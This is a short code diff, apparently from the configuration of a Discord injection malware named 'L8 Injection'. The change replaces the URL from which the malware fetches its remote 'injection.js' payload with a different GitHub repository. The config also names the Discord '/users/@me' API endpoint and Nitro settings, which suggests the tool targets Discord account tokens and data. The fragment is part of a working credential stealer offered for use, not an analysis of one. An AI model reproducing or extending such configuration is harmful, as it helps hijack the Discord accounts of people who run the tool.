@@ -15,7 +15,7 @@ const config = {
   embed_name: 'L8 Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1127315959313608767/1139114504261742652/pfp.png',
   embed_color: 00000, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/l838l838/injectionl8/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
